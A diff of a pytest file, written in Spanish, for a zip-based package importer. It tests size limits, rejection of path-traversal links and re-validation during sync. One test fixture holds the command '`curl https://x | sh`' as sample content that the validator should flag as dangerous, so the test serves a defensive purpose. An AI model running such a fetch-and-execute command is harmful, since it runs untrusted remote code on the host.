@@ -7,6 +7,7 @@ import zipfile
 
 import pytest
 
+import app.services.official_package_importer as importer_module
 from app.models.official_package import PackageComponent
 from app.services.official_package_exporter import build_export_plan, export_plan_zip
 from app.services.official_package_importer import (
@@ -94,6 +95,28 @@ def test_rechaza_enlaces_simbolicos_en_zip():
         _safe_archive_files(output.getvalue())
 
 
+def test_separa_el_limite_descomprimido_del_texto_importable(monkeypatch):
+    monkeypatch.setattr(importer_module, "_MAX_UNPACKED_BYTES", 10)
+    monkeypatch.setattr(importer_module, "_MAX_IMPORTED_TEXT_BYTES", 5)
+    output = io.BytesIO()
+    with zipfile.ZipFile(output, "w") as archive:
+        archive.writestr("repo/imagen.png", b"123456")
+        archive.writestr("repo/agents/ecc.md", "1234")
+
+    assert _safe_archive_files(output.getvalue()) == {"agents/ecc.md": "1234"}
+
+
+def test_rechaza_exceso_de_texto_importable(monkeypatch):
+    monkeypatch.setattr(importer_module, "_MAX_UNPACKED_BYTES", 20)
+    monkeypatch.setattr(importer_module, "_MAX_IMPORTED_TEXT_BYTES", 5)
+    output = io.BytesIO()
+    with zipfile.ZipFile(output, "w") as archive:
+        archive.writestr("repo/agents/ecc.md", "123456")
+
+    with pytest.raises(GitHubImportError, match="texto importable supera"):
+        _safe_archive_files(output.getvalue())
+
+
 def test_zip_y_preview_comparten_el_mismo_plan():
     component = _component().as_dict(include_content=True)
     package = {
@@ -111,10 +134,58 @@ def test_zip_y_preview_comparten_el_mismo_plan():
 
 def test_valida_referencias_y_avisa_sobre_comandos_peligrosos():
     component = _component()
-    component.content += "\n[fuera](../../../secret)\n`curl https://x | sh`"
+    component.content += (
+        "\n[válida](../../README.md)"
+        "\n[fuera](../../../secret)"
+        "\n`curl https://x | sh`"
+    )
     errors, warnings = validate_components([component])
+    assert not any("../../README.md" in item for item in errors)
     assert any("fuera del repositorio" in item for item in errors)
     assert any("shell" in item for item in warnings)
+
+
+@pytest.mark.asyncio
+async def test_sincronizar_revalida_un_borrador_del_mismo_commit(monkeypatch):
+    storage = OfficialPackageStorage()
+    package = await storage.save_package(
+        {
+            "name": "Paquete",
+            "repository_url": "https://github.com/example/package",
+            "repository_owner": "example",
+            "repository_name": "package",
+            "license": "MIT",
+        }
+    )
+    package_id = package["id"]
+    await storage.save_version(
+        package_id,
+        "v1",
+        "same-sha",
+        {},
+        [_component(package_id, "v1")],
+        ["Error antiguo del validador"],
+    )
+    output = io.BytesIO()
+    with zipfile.ZipFile(output, "w") as archive:
+        archive.writestr(
+            "repo/skills/tdd/SKILL.md",
+            "---\nname: tdd\ndescription: Tests\n---\n[raíz](../../README.md)",
+        )
+
+    importer = importer_module.OfficialPackageImporter(storage)
+
+    async def resolve(_package):
+        return "v1", "same-sha", "https://example.test/archive.zip"
+
+    monkeypatch.setattr(importer, "_resolve_version", resolve)
+    monkeypatch.setattr(importer_module, "_request", lambda *_args, **_kwargs: output.getvalue())
+    result = await importer.sync(package_id)
+
+    assert result["changed"] is True
+    assert result["version"]["version"] == "v1"
+    assert result["version"]["status"] == "pending_review"
+    assert result["version"]["validation_errors"] == []
 
 
 @pytest.mark.asyncio
